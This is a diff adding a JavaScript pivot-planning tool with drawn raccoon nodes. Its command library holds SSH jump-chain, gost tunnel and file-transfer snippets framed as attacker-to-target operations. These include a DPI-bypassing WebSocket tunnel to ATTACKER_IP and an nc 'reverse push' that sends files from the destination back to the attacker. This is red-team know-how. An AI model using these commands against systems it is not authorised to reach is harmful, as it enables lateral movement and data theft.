+        { type:'cmd', text:'./gost -L=socks5://:1080' },
+        { type:'comment', text:'# Port forward: pivot:2222 → target:22' },
+        { type:'cmd', text:'./gost -L=tcp://:2222/TARGET_IP:22' },
+        { type:'comment', text:'# Chain proxies (pivot → next proxy)' },
+        { type:'cmd', text:'./gost -L=:8080 -F=socks5://NEXT_HOP_IP:1080' },
+        { type:'comment', text:'# SOCKS5 over WebSocket (bypass DPI)' },
+        { type:'cmd', text:'./gost -L=socks5://:1080 -F=ws://ATTACKER_IP:8080' },
+      ],
+      reference: [
+        { type:'comment', text:'# TLS encrypted tunnel' },
+        { type:'cmd', text:'./gost -L=tls://:443/:1080 -F=socks5://127.0.0.1:1080' },
+        { type:'comment', text:'# QUIC tunnel (UDP-based, fast)' },
+        { type:'cmd', text:'./gost -L=quic://:6121 -F=socks5://127.0.0.1:1080' },
+        { type:'comment', text:'# KCP tunnel (UDP, low latency)' },
+        { type:'cmd', text:'./gost -L=kcp://:8388 -F=socks5://127.0.0.1:1080' },
+        { type:'comment', text:'# TUN interface mode (full IP tunnel)' },
+        { type:'cmd', text:'./gost -L="tun://:8421?net=192.168.123.2/24&gw=192.168.123.1"' },
+        { type:'comment', text:'# Shadowsocks tunnel' },
+        { type:'cmd', text:'./gost -L=ss://chacha20:password@:8338' },
+        { type:'comment', text:'# Multi-hop chain: client → ws → tls → target' },
+        { type:'cmd', text:'./gost -L=:1080 -F=ws://hop1:8080 -F=tls://hop2:443 -F=socks5://TARGET_IP:1080' },
+      ],
+    },
+  },
+  filetransfer: {
+    'scp/rsync': {
+      setup: [
+        { type:'comment', text:'# Pull file from target via ProxyJump chain' },
+        { type:'cmd', text:'scp -J user@PIVOT_IP user@TARGET_IP:/remote/file ./downloads/' },
+        { type:'comment', text:'# Pull with -3 flag (three-way copy, no direct connection needed)' },
+        { type:'cmd', text:'scp -J user@PIVOT_IP -3 user@TARGET_IP:/remote/file ./downloads/' },
+        { type:'comment', text:'# Push file to target' },
+        { type:'cmd', text:'scp -J user@PIVOT_IP ./local/file user@TARGET_IP:/tmp/' },
+        { type:'comment', text:'# Rsync directory sync (Linux)' },
+        { type:'cmd', text:'rsync -avz -e "ssh -J user@PIVOT_IP" user@TARGET_IP:/remote/path/ ./downloads/' },
+        { type:'cmd', text:'rsync -avz -e "ssh -J user@PIVOT_IP" ./dir/ user@TARGET_IP:/remote/path/' },
+        { type:'comment', text:'# Note: Windows — rsync optional, use scp or sftp instead' },
+      ],
+      verify: [
+        { type:'comment', text:'# Verify SSH connectivity to destination' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "hostname && whoami"' },
+        { type:'comment', text:'# Hash validation (Linux)' },
+        { type:'cmd', text:'sha256sum ./downloads/file' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "sha256sum /remote/file"' },
+        { type:'comment', text:'# Hash validation (Windows)' },
+        { type:'cmd', text:'Get-FileHash .\\downloads\\file -Algorithm SHA256' },
+      ],
+      nexthop: [],
+      reference: [],
+    },
+    sftp: {
+      setup: [
+        { type:'comment', text:'# Interactive SFTP session via ProxyJump' },
+        { type:'cmd', text:'sftp -J user@PIVOT_IP user@TARGET_IP' },
+        { type:'comment', text:'# Inside SFTP session:' },
+        { type:'cmd', text:'ls -l' },
+        { type:'cmd', text:'get /remote/path/file' },
+        { type:'cmd', text:'put ./local/file /remote/path/file' },
+        { type:'cmd', text:'mget /remote/path/*.log' },
+      ],
+      verify: [],
+      nexthop: [],
+      reference: [],
+    },
+    'Reverse Push': {
+      setup: [
+        { type:'comment', text:'# Reverse push-back: destination sends file to attacker' },
+        { type:'comment', text:'# Step 1: Open reverse listener from attacker through chain' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP -R 0.0.0.0:9999:127.0.0.1:9999 user@TARGET_IP' },
+        { type:'comment', text:'# Step 2: Start receiver on attacker' },
+        { type:'cmd', text:'nc -lvp 9999 > received_file.bin' },
+        { type:'comment', text:'# Step 3: On destination, push file back' },
+        { type:'cmd', text:'nc 127.0.0.1 9999 < /path/to/file' },
+        { type:'comment', text:'# Alternative: scp from destination to attacker via reverse tunnel' },
+        { type:'cmd', text:'scp -P 9999 /path/to/file user@127.0.0.1:/tmp/' },
+      ],
+      verify: [
+        { type:'cmd', text:'ss -tlnp | grep 9999' },
+      ],
+      nexthop: [],
+      reference: [],
+    },
+    'Tar Stream': {
+      setup: [
+        { type:'comment', text:'# Stream tar archive over SSH (no temp file on target)' },
+        { type:'comment', text:'# Linux:' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "tar czf - /remote/path" > remote-path.tgz' },
+        { type:'comment', text:'# Remote script execution with log retrieval' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "bash /tmp/deploy.sh > /tmp/results.log 2>&1"' },
+        { type:'cmd', text:'scp -J user@PIVOT_IP user@TARGET_IP:/tmp/results.log ./results.log' },
+        { type:'comment', text:'# Windows:' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "powershell Compress-Archive -Path C:\\remote\\path\\* -DestinationPath C:\\tmp\\bundle.zip"' },
+        { type:'cmd', text:'scp -J user@PIVOT_IP user@TARGET_IP:C:\\tmp\\bundle.zip ./bundle.zip' },
+      ],
+      verify: [
+        { type:'cmd', text:'tar tzf remote-path.tgz | head' },
+      ],
+      nexthop: [],
+      reference: [],
+    },
+    Verify: {
+      setup: [
+        { type:'comment', text:'# Packaging on destination before transfer' },
+        { type:'comment', text:'# Linux:' },
+        { type:'cmd', text:'tar czf /tmp/bundle.tgz /path/to/artifacts' },
+        { type:'cmd', text:'sha256sum /tmp/bundle.tgz' },
+        { type:'comment', text:'# Windows:' },
+        { type:'cmd', text:'Compress-Archive -Path C:\\path\\to\\artifacts\\* -DestinationPath C:\\tmp\\bundle.zip' },
+        { type:'cmd', text:'Get-FileHash C:\\tmp\\bundle.zip -Algorithm SHA256' },
+        { type:'comment', text:'# End-to-end transfer check' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "hostname && whoami && ls -la /tmp/bundle*"' },
+      ],
+      verify: [
+        { type:'comment', text:'# Confirm local file integrity matches remote' },
+        { type:'cmd', text:'sha256sum ./downloads/bundle.tgz' },
+      ],
+      nexthop: [],
+      reference: [],
+    },
+  },
+  firewall: {
+    'sshd Policy': {
+      setup: [
+        { type:'comment', text:'# === Operator SSH client config (~/.ssh/config) ===' },
+        { type:'cmd', text:'# Add to ~/.ssh/config on attacker:' },
+        { type:'comment', text:'Host *' },
+        { type:'comment', text:'  ServerAliveInterval 30' },
+        { type:'comment', text:'  ServerAliveCountMax 3' },
+        { type:'comment', text:'  ControlMaster auto' },
+        { type:'comment', text:'  ControlPath ~/.ssh/cm-%C' },
+        { type:'comment', text:'  ControlPersist 10m' },
+        { type:'comment', text:'  ExitOnForwardFailure yes' },
+        { type:'comment', text:'  StrictHostKeyChecking accept-new' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === sshd daemon config on pivots/targets ===' },
+        { type:'comment', text:'# Ensure these are set in /etc/ssh/sshd_config:' },
+        { type:'cmd', text:'sudo grep -E "AllowTcpForwarding|GatewayPorts|PermitTunnel" /etc/ssh/sshd_config' },
+        { type:'comment', text:'#   AllowTcpForwarding yes' },
+        { type:'comment', text:'#   GatewayPorts yes' },
+        { type:'comment', text:'#   PermitTunnel yes' },
+        { type:'cmd', text:'sudo systemctl restart sshd' },
+        { type:'comment', text:'# Windows sshd:' },
+        { type:'cmd', text:'Get-Content C:\\ProgramData\\ssh\\sshd_config | Select-String "AllowTcpForwarding|GatewayPorts|PermitTunnel"' },
+      ],
+      verify: [
+        { type:'cmd', text:'sudo sshd -T | egrep "allowtcpforwarding|gatewayports|permittunnel"' },
+      ],
+      nexthop: [],
+      reference: [],
+    },
+    Probe: {
+      setup: [
+        { type:'comment', text:'# === Probe policy and listener state ===' },
+        { type:'comment', text:'# From attacker: probe each hop through the chain' },
+        { type:'cmd', text:'ssh -o ConnectTimeout=5 user@PIVOT_IP "echo hop1 OK"' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP -o ConnectTimeout=5 user@TARGET_IP "echo target OK"' },
+        { type:'comment', text:'# Check auth and policy drift' },
+        { type:'cmd', text:'ssh -v user@PIVOT_IP 2>&1 | grep -i "authentication"' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === Local validation on each node ===' },
+        { type:'comment', text:'# Linux:' },
+        { type:'cmd', text:'sudo ss -tlnp | grep -E ":22|:8080|:9090"' },
+        { type:'cmd', text:'sudo sshd -T | egrep "allowtcpforwarding|gatewayports|permittunnel"' },
+        { type:'comment', text:'# Windows:' },
+        { type:'cmd', text:'Get-NetTCPConnection -State Listen -LocalPort 22' },
+        { type:'comment', text:'# macOS:' },
+        { type:'cmd', text:'sudo lsof -iTCP:22 -sTCP:LISTEN' },
+      ],
+      verify: [
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "hostname && whoami"' },
+      ],
+      nexthop: [],
+      reference: [],
+    },
+    'Firewall Rules': {
+      setup: [
+        { type:'comment', text:'# ╔══════════════════════════════════════╗' },
+        { type:'comment', text:'# ║  Open only what the chain needs     ║' },
+        { type:'comment', text:'# ╚══════════════════════════════════════╝' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === Linux: UFW (Ubuntu / Debian) ===' },
+        { type:'cmd', text:'sudo ufw allow 22/tcp' },
+        { type:'cmd', text:'sudo ufw allow 8080/tcp' },
+        { type:'cmd', text:'sudo ufw allow 9090/tcp' },
+        { type:'cmd', text:'sudo ufw status verbose' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === Linux: firewalld (Fedora / RHEL) ===' },
+        { type:'cmd', text:'sudo firewall-cmd --permanent --add-service=ssh' },
+        { type:'cmd', text:'sudo firewall-cmd --permanent --add-port=8080/tcp' },
+        { type:'cmd', text:'sudo firewall-cmd --permanent --add-port=9090/tcp' },
+        { type:'cmd', text:'sudo firewall-cmd --reload' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === Linux: iptables (manual) ===' },
+        { type:'cmd', text:'echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward' },
+        { type:'cmd', text:'iptables -A INPUT -p tcp --dport 22 -j ACCEPT' },
+        { type:'cmd', text:'iptables -A INPUT -p tcp --dport 8080 -j ACCEPT' },
+        { type:'cmd', text:'iptables -t nat -A PREROUTING -i eth0 -p tcp --dport LPORT -j DNAT --to-destination TARGET_IP:RPORT' },
+        { type:'cmd', text:'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === Linux: nftables ===' },
+        { type:'cmd', text:'nft add rule inet filter input tcp dport 22 accept' },
+        { type:'cmd', text:'nft add rule inet filter input tcp dport 8080 accept' },
+        { type:'cmd', text:'nft list ruleset' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === Windows ===' },
+        { type:'cmd', text:'Set-Service -Name sshd -StartupType Automatic' },
+        { type:'cmd', text:'Start-Service sshd' },
+        { type:'cmd', text:'Get-NetFirewallRule -Name *ssh*' },
+        { type:'cmd', text:'New-NetFirewallRule -DisplayName "Allow SSH 22" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 22' },
+        { type:'cmd', text:'New-NetFirewallRule -DisplayName "Allow Tunnel Listener 8080" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === macOS ===' },
+        { type:'cmd', text:'sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate' },
+        { type:'cmd', text:'sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getstealthmode' },
+        { type:'cmd', text:'sudo pfctl -sr' },
+        { type:'cmd', text:'sudo lsof -iTCP:22 -sTCP:LISTEN' },
+      ],
+      verify: [
+        { type:'comment', text:'# Linux:' },
+        { type:'cmd', text:'sudo ss -tlnp | grep -E ":22|:8080|:9090"' },
+        { type:'comment', text:'# Windows:' },
+        { type:'cmd', text:'Get-NetTCPConnection -State Listen -LocalPort 22' },
+      ],
+      nexthop: [],
+      reference: [],
+    },
+    Validate: {
+      setup: [
+        { type:'comment', text:'# === End-to-end chain validation ===' },
+        { type:'comment', text:'# Verify full chain from attacker to target' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "hostname && whoami"' },
+        { type:'comment', text:'# Check SSH multiplex state' },
+        { type:'cmd', text:'ssh -S ~/.ssh/cm-%C -O check user@PIVOT_IP' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === Per-hop validation ===' },
+        { type:'comment', text:'# Linux: confirm forwarding to next hop' },
+        { type:'cmd', text:'nc -zv NEXT_HOP_IP 22' },
+        { type:'cmd', text:'sudo ss -tlnp | grep ssh' },
+        { type:'comment', text:'# Windows:' },
+        { type:'cmd', text:'Get-NetTCPConnection -State Listen -LocalPort 22' },
+        { type:'cmd', text:'Test-NetConnection -ComputerName NEXT_HOP_IP -Port 22' },
+        { type:'comment', text:'' },
+        { type:'comment', text:'# === Validate target listeners ===' },
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "ss -tlnp"' },
+      ],
+      verify: [
+        { type:'cmd', text:'ssh -J user@PIVOT_IP user@TARGET_IP "echo chain OK && date"' },
+      ],
+      nexthop: [],
+      reference: [],
+    },
+  },
+};
+
+// ============ CANVAS ============
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+let W, H, zoom=1, panX=0, panY=0, dragNode=null, dragOffX=0, dragOffY=0, panning=false, panStartX=0, panStartY=0;
+let resizing=null, resizeCorner=null, resizeStartX=0, resizeStartY=0, resizeStartW=0, resizeStartH=0;
+
+function resize() {
+  const rect = canvas.parentElement.getBoundingClientRect();
+  W = canvas.width = rect.width * devicePixelRatio;
+  H = canvas.height = rect.height * devicePixelRatio;
+  canvas.style.width = rect.width+'px';
+  canvas.style.height = rect.height+'px';
+  ctx.setTransform(devicePixelRatio,0,0,devicePixelRatio,0,0);
+  layoutNodes();
+}
+
+function layoutNodes() {
+  const cw = W/devicePixelRatio, ch = H/devicePixelRatio;
+  const n = nodes.length;
+  nodes.forEach((nd,i) => {
+    if(!nd._placed) {
+      nd.x = cw*0.15 + (cw*0.7)*i/(Math.max(n-1,1));
+      nd.y = ch/2;
+      nd._placed = true;
+    }
+  });
+}
+
+function snapNodes() {
+  const cw = W/devicePixelRatio, ch = H/devicePixelRatio;
+  const n = nodes.length;
+  nodes.forEach((nd,i) => {
+    nd.x = cw*0.15 + (cw*0.7)*i/(Math.max(n-1,1));
+    nd.y = ch/2;
+  });
+}
+
+function drawRaccoon(cx, cy, size, nodeType, time) {
+  const s = size/2;
+  const glow = nodeType==='pivot'?'#4af04a':nodeType==='starting'?'#f0a84a':'#4ac8f0';
+  const pulseR = s + 6 + Math.sin(time*0.003)*2;
+
+  // Outer glow ring
+  ctx.beginPath(); ctx.arc(cx, cy, pulseR+4, 0, Math.PI*2);
+  ctx.strokeStyle = glow+'33'; ctx.lineWidth=1; ctx.stroke();
+
+  // Main circle
+  ctx.beginPath(); ctx.arc(cx, cy, pulseR, 0, Math.PI*2);
+  ctx.fillStyle = '#0c1a0c'; ctx.fill();
+  ctx.strokeStyle = glow; ctx.lineWidth=2; ctx.stroke();
+
+  // Raccoon face
+  ctx.save(); ctx.translate(cx, cy);
+
+  // Ears
+  ctx.fillStyle='#4a4a4a';
+  ctx.beginPath(); ctx.moveTo(-14,-18); ctx.lineTo(-10,-28); ctx.lineTo(-4,-18); ctx.closePath(); ctx.fill();
+  ctx.beginPath(); ctx.moveTo(14,-18); ctx.lineTo(10,-28); ctx.lineTo(4,-18); ctx.closePath(); ctx.fill();
+  // Inner ears
+  ctx.fillStyle='#2a2a2a';
+  ctx.beginPath(); ctx.moveTo(-12,-19); ctx.lineTo(-10,-25); ctx.lineTo(-6,-19); ctx.closePath(); ctx.fill();
+  ctx.beginPath(); ctx.moveTo(12,-19); ctx.lineTo(10,-25); ctx.lineTo(6,-19); ctx.closePath(); ctx.fill();
+
+  // Face
+  ctx.beginPath(); ctx.ellipse(0, -2, 18, 16, 0, 0, Math.PI*2);
+  ctx.fillStyle='#5a5a5a'; ctx.fill();
+
+  // Mask (dark patches around eyes)
+  ctx.fillStyle='#1a1a1a';
+  ctx.beginPath(); ctx.ellipse(-8, -6, 8, 6, -0.2, 0, Math.PI*2); ctx.fill();
+  ctx.beginPath(); ctx.ellipse(8, -6, 8, 6, 0.2, 0, Math.PI*2); ctx.fill();
+
+  // Eyes (glowing)
+  ctx.fillStyle = glow;
+  ctx.shadowColor = glow; ctx.shadowBlur = 6;
+  ctx.beginPath(); ctx.ellipse(-8, -6, 3, 3.5, 0, 0, Math.PI*2); ctx.fill();
+  ctx.beginPath(); ctx.ellipse(8, -6, 3, 3.5, 0, 0, Math.PI*2); ctx.fill();
+  ctx.shadowBlur = 0;
+
+  // Pupils
+  ctx.fillStyle='#000';
+  ctx.beginPath(); ctx.arc(-8, -5.5, 1.5, 0, Math.PI*2); ctx.fill();
+  ctx.beginPath(); ctx.arc(8, -5.5, 1.5, 0, Math.PI*2); ctx.fill();
+
+  // Nose
+  ctx.fillStyle='#222';
+  ctx.beginPath(); ctx.ellipse(0, 4, 4, 3, 0, 0, Math.PI*2); ctx.fill();
+
+  // Snout lighter area
+  ctx.fillStyle='#7a7a7a';
+  ctx.beginPath(); ctx.ellipse(0, 6, 7, 5, 0, 0, Math.PI*2); ctx.fill();
+
+  // Nose detail
+  ctx.fillStyle='#111';
+  ctx.beginPath(); ctx.ellipse(0, 3, 2.5, 2, 0, 0, Math.PI*2); ctx.fill();
+
+  ctx.restore();
+}
+
+function drawArrowLine(x1,y1,x2,y2,color,time) {
+  const dx=x2-x1, dy=y2-y1, dist=Math.sqrt(dx*dx+dy*dy);
+  if(dist<1) return;
+
+  // Animated dashes
+  ctx.beginPath();
+  ctx.setLineDash([12,6]);
+  ctx.lineDashOffset = -time*0.05;
+  ctx.moveTo(x1,y1); ctx.lineTo(x2,y2);
+  ctx.strokeStyle=color; ctx.lineWidth=2.5;
+  ctx.shadowColor=color; ctx.shadowBlur=4;
+  ctx.stroke();
+  ctx.shadowBlur=0;
+  ctx.setLineDash([]);
+
+  // Arrowhead
+  const angle=Math.atan2(dy,dx);
+  ctx.beginPath(); ctx.moveTo(x2,y2);
+  ctx.lineTo(x2-12*Math.cos(angle-0.35), y2-12*Math.sin(angle-0.35));
+  ctx.lineTo(x2-12*Math.cos(angle+0.35), y2-12*Math.sin(angle+0.35));
+  ctx.closePath(); ctx.fillStyle=color; ctx.fill();
+
+  // Traveling packet dot
+  const progress = ((time*0.002) % 1);
+  const px = x1 + (x2-x1)*progress;
+  const py = y1 + (y2-y1)*progress;
+  ctx.beginPath(); ctx.arc(px,py,3,0,Math.PI*2);
+  ctx.fillStyle='#fff'; ctx.shadowColor=color; ctx.shadowBlur=8; ctx.fill();
+  ctx.shadowBlur=0;
+}
+
+function drawConnectorDot(x,y,color) {
+  ctx.beginPath(); ctx.arc(x,y,4,0,Math.PI*2);
+  ctx.fillStyle=color; ctx.fill();
+  ctx.beginPath(); ctx.arc(x,y,6,0,Math.PI*2);
+  ctx.strokeStyle=color+'55'; ctx.lineWidth=1; ctx.stroke();
+}
+
+function drawSubnetBox(sub, time) {
+  const w=sub.w||140, h=sub.h||80;
+  const x=sub.x-w/2, y=sub.y-h/2;
+  const glow='#f0a84a';
+  const pulse = Math.sin(time*0.003)*1.5;
+
+  // Outer glow
+  ctx.shadowColor=glow; ctx.shadowBlur=8+pulse;
+  ctx.strokeStyle=glow; ctx.lineWidth=2;
+  ctx.setLineDash([6,4]); ctx.lineDashOffset=-time*0.03;
+  ctx.strokeRect(x,y,w,h);
+  ctx.setLineDash([]); ctx.shadowBlur=0;
+
+  // Fill
+  ctx.fillStyle='#0c1a0c'; ctx.fillRect(x,y,w,h);
+
+  // Border again (solid inner)
+  ctx.strokeStyle=glow+'88'; ctx.lineWidth=1;
+  ctx.strokeRect(x+3,y+3,w-6,h-6);
+
+  // Network icon (small grid)
+  ctx.strokeStyle=glow+'66'; ctx.lineWidth=1;
+  const gx=sub.x-12, gy=sub.y - h*0.2;
+  for(let i=0;i<3;i++) for(let j=0;j<3;j++) {
+    ctx.beginPath(); ctx.arc(gx+i*8, gy+j*8, 1.5, 0, Math.PI*2);
+    ctx.fillStyle=i===1&&j===1?glow:glow+'55'; ctx.fill();
+  }
+  ctx.beginPath(); ctx.moveTo(gx,gy+8); ctx.lineTo(gx+16,gy+8); ctx.moveTo(gx+8,gy); ctx.lineTo(gx+8,gy+16);
+  ctx.strokeStyle=glow+'33'; ctx.lineWidth=0.5; ctx.stroke();
+
+  // Label (top-right corner)
+  ctx.textAlign='right'; ctx.textBaseline='top';
+  ctx.font='bold 9px JetBrains Mono,monospace'; ctx.fillStyle=glow;
+  ctx.fillText(sub.label, x+w-8, y+6);
+  ctx.font='9px JetBrains Mono,monospace'; ctx.fillStyle='#6fbf6f';
+  ctx.fillText(sub.ip, x+w-8, y+18);
+
+  // Selection + resize handles
+  if(sub===selectedNode) {
+    ctx.strokeStyle='#f0a84a55'; ctx.lineWidth=2; ctx.setLineDash([4,4]);
+    ctx.lineDashOffset=-time*0.02;
+    ctx.strokeRect(x-4,y-4,w+8,h+8);
+    ctx.setLineDash([]);
+
+    // Draw resize handles (4 corners + 4 edge midpoints)
+    const hs=8;
+    const corners = [
+      [x,y],[x+w,y],[x+w,y+h],[x,y+h],
+      [x+w/2,y],[x+w,y+h/2],[x+w/2,y+h],[x,y+h/2]
+    ];
+    corners.forEach(([cx,cy]) => {
+      ctx.beginPath(); ctx.arc(cx, cy, hs/2, 0, Math.PI*2);
+      ctx.fillStyle='#f0a84a'; ctx.fill();
+      ctx.strokeStyle='#080b0f'; ctx.lineWidth=1.5; ctx.stroke();
+      // inner glow
+      ctx.beginPath(); ctx.arc(cx, cy, hs/2-2, 0, Math.PI*2);
+      ctx.fillStyle='#f0a84aaa'; ctx.fill();
+    });
+  }
+}
+
+let startTime = performance.now();
+
+function draw() {
+  const time = performance.now() - startTime;
+  const cw=W/devicePixelRatio, ch=H/devicePixelRatio;
+  ctx.clearRect(0,0,cw,ch);
+
+  ctx.save();
+  ctx.translate(cw/2 + panX, ch/2 + panY);
+  ctx.scale(zoom, zoom);
+  ctx.translate(-cw/2, -ch/2);
+
+  // Draw subnets first (background layer)
+  subnets.forEach(sub => {
+    drawSubnetBox(sub, time);
+
+    // Find nearest chain node
+    let nearest=nodes[0], minD=Infinity;
+    nodes.forEach(n => { const d=Math.hypot(n.x-sub.x,n.y-sub.y); if(d<minD){minD=d;nearest=n;} });
+
+    // Draw dashed connection line to nearest node
+    const sw=sub.w||140, sh=sub.h||80;
+    const dx=nearest.x-sub.x, dy=nearest.y-sub.y, dist=Math.sqrt(dx*dx+dy*dy)||1;
+    const ux=dx/dist, uy=dy/dist;
+    const x1=sub.x+ux*(sw/2+4), y1=sub.y+uy*(sh/2+4);
+    const x2=nearest.x-ux*38, y2=nearest.y-uy*38;
+    ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2);
+    ctx.setLineDash([4,6]); ctx.strokeStyle='#f0a84a55'; ctx.lineWidth=1.5; ctx.stroke(); ctx.setLineDash([]);
+    drawConnectorDot(x1,y1,'#f0a84a');
+  });
+
+  // Draw connections
+  for(let i=0; i<nodes.length-1; i++) {
+    const a=nodes[i], b=nodes[i+1];
+    const r=36;
+    const dx=b.x-a.x, dy=b.y-a.y, dist=Math.sqrt(dx*dx+dy*dy)||1;
+    const nx=dx/dist, ny=dy/dist;
+    const x1=a.x+nx*(r+10), y1=a.y+ny*(r+10);
+    const x2=b.x-nx*(r+10), y2=b.y-ny*(r+10);
+
+    drawConnectorDot(a.x+nx*(r+4), a.y+ny*(r+4), '#4af04a');
+    drawConnectorDot(b.x-nx*(r+4), b.y-ny*(r+4), '#f0a84a');
+    drawArrowLine(x1,y1,x2,y2,'#4af04a',time+i*500);
+  }
+
+  // Draw nodes
+  nodes.forEach(n => {
+    drawRaccoon(n.x, n.y, 54, n.type, time);
+
+    const labelColor = n.type==='pivot'?'#4af04a':n.type==='starting'?'#f0a84a':'#4ac8f0';
+    ctx.textAlign='center'; ctx.textBaseline='top';
+    ctx.font='bold 10px JetBrains Mono,monospace'; ctx.fillStyle=labelColor;
+    ctx.shadowColor=labelColor; ctx.shadowBlur=4;
+    ctx.fillText(n.label, n.x, n.y+40);
+    ctx.shadowBlur=0;
+    ctx.font='10px JetBrains Mono,monospace'; ctx.fillStyle='#6fbf6f';
+    ctx.fillText(n.ip, n.x, n.y+54);
+    // Show ports and OS below
+    const osIcons = {linux:'&#x1F427;',windows:'&#x1F5A5;',macos:'&#x1F34E;',freebsd:'&#x1F608;',unknown:''};
+    const osIcon = n.os && n.os!=='linux' ? '' : '';
+    const extra = [n.os!=='linux'&&n.os?n.os:null, n.ports?':'+n.ports:null].filter(Boolean).join(' ');
+    if(extra) {
+      ctx.font='9px JetBrains Mono,monospace'; ctx.fillStyle='#3a6a3a';
+      ctx.fillText(extra, n.x, n.y+66);
+    }
+    // OS badge top-right
+    if(n.os) {
+      const badge = n.os==='windows'?'W':n.os==='macos'?'M':n.os==='freebsd'?'F':'L';
+      ctx.font='bold 8px JetBrains Mono,monospace';
+      ctx.fillStyle=labelColor+'88'; ctx.textAlign='right';
+      ctx.fillText(badge, n.x+28, n.y-28);
+      ctx.textAlign='center';
+    }
+
+    if(n===selectedNode) {
+      ctx.beginPath(); ctx.arc(n.x, n.y, 42, 0, Math.PI*2);
+      ctx.strokeStyle='#4af04a55'; ctx.lineWidth=2; ctx.setLineDash([4,4]);
+      ctx.lineDashOffset = -time*0.02;
+      ctx.stroke(); ctx.setLineDash([]);
+    }
+  });
+
+  // Draw infra nodes
+  infraNodes.forEach(n => drawInfraNode(n, time));
+
+  ctx.restore();
+  requestAnimationFrame(draw);
+}
+
+// Interaction
+function canvasCoords(e) {
+  const r=canvas.getBoundingClientRect();
+  const cw=W/devicePixelRatio, ch=H/devicePixelRatio;
+  const sx=e.clientX-r.left, sy=e.clientY-r.top;
+  // reverse: translate(cw/2+panX, ch/2+panY) -> scale(zoom) -> translate(-cw/2, -ch/2)
+  const wx = (sx - cw/2 - panX)/zoom + cw/2;
+  const wy = (sy - ch/2 - panY)/zoom + ch/2;
+  return { x:wx, y:wy };
+}
+
+canvas.addEventListener('mousemove', e => {
+  if(panning) { panX=e.clientX-panStartX; panY=e.clientY-panStartY; return; }
+  if(resizing) {
+    const {x,y}=canvasCoords(e);
+    const dx=x-resizeStartX, dy=y-resizeStartY;
+    const minW=80, minH=50;
+    const dir=resizeCorner;
+    if(dir==='br') { resizing.w=Math.max(minW,resizeStartW+dx*2); resizing.h=Math.max(minH,resizeStartH+dy*2); }
+    else if(dir==='bl') { resizing.w=Math.max(minW,resizeStartW-dx*2); resizing.h=Math.max(minH,resizeStartH+dy*2); }
+    else if(dir==='tr') { resizing.w=Math.max(minW,resizeStartW+dx*2); resizing.h=Math.max(minH,resizeStartH-dy*2); }
+    else if(dir==='tl') { resizing.w=Math.max(minW,resizeStartW-dx*2); resizing.h=Math.max(minH,resizeStartH-dy*2); }
+    else if(dir==='r') { resizing.w=Math.max(minW,resizeStartW+dx*2); }
+    else if(dir==='l') { resizing.w=Math.max(minW,resizeStartW-dx*2); }
+    else if(dir==='b') { resizing.h=Math.max(minH,resizeStartH+dy*2); }
+    else if(dir==='t') { resizing.h=Math.max(minH,resizeStartH-dy*2); }
+    return;
+  }
+  if(!dragNode) return;
+  const {x,y}=canvasCoords(e);
+  dragNode.x=x-dragOffX; dragNode.y=y-dragOffY;
+});
+canvas.addEventListener('mouseup', () => { if(dragNode||resizing) saveState(); dragNode=null; panning=false; resizing=null; resizeCorner=null; canvas.classList.remove('dragging'); });
+canvas.addEventListener('mouseleave', () => { dragNode=null; panning=false; resizing=null; resizeCorner=null; canvas.classList.remove('dragging'); });
+canvas.addEventListener('contextmenu', e => e.preventDefault());
+
+// Zoom
+function zoomIn() { zoom=Math.min(zoom*1.2,5); }
+function zoomOut() { zoom=Math.max(zoom/1.2,0.2); }
+function zoomReset() { zoom=1; panX=0; panY=0; }
+
+// Mouse wheel zoom (zoom toward cursor)
+canvas.addEventListener('wheel', e => {
+  e.preventDefault();
+  const factor = e.deltaY < 0 ? 1.1 : 1/1.1;
+  const newZoom = Math.max(0.2, Math.min(5, zoom*factor));
+  // Adjust pan so zoom centers on cursor
+  const r=canvas.getBoundingClientRect();
+  const cw=W/devicePixelRatio, ch=H/devicePixelRatio;
+  const mx=e.clientX-r.left - cw/2 - panX;
+  const my=e.clientY-r.top - ch/2 - panY;
+  panX -= mx*(newZoom/zoom - 1);
+  panY -= my*(newZoom/zoom - 1);
+  zoom = newZoom;
+}, {passive:false});
+
+// Middle-click or right-click pan
+canvas.addEventListener('mousedown', e => {
+  if(e.button===1 || e.button===2) {
+    e.preventDefault();
+    panning=true; panStartX=e.clientX-panX; panStartY=e.clientY-panY;
+    canvas.classList.add('dragging');
+    return;
+  }
+  const {x,y}=canvasCoords(e);
+  // Check resize handles on selected subnet
+  if(selectedNode && selectedNode.type==='subnet') {
+    const s=selectedNode, sw=s.w||140, sh=s.h||80;
+    const corners = [
+      {cx:s.x-sw/2, cy:s.y-sh/2, dir:'tl'},
+      {cx:s.x+sw/2, cy:s.y-sh/2, dir:'tr'},
+      {cx:s.x+sw/2, cy:s.y+sh/2, dir:'br'},
+      {cx:s.x-sw/2, cy:s.y+sh/2, dir:'bl'},
+      {cx:s.x,      cy:s.y-sh/2, dir:'t'},
